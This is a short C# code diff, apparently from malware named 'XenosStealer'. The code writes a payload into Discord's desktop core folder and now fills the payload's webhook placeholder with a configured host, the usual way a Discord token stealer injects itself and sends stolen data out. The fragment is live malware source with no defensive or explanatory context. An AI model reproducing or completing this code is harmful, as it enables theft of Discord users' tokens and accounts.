@@ -127,7 +127,7 @@ namespace Xenos
                                 try
                                 {
                                     Directory.CreateDirectory(core + @"\discord_desktop_core\XenosStealer");
-                                    File.WriteAllText(file, Payload);
+                                    File.WriteAllText(file, Payload.Replace("%WEBHOOK_LINK%", Host));
                                 }
                                 catch { };
                             });
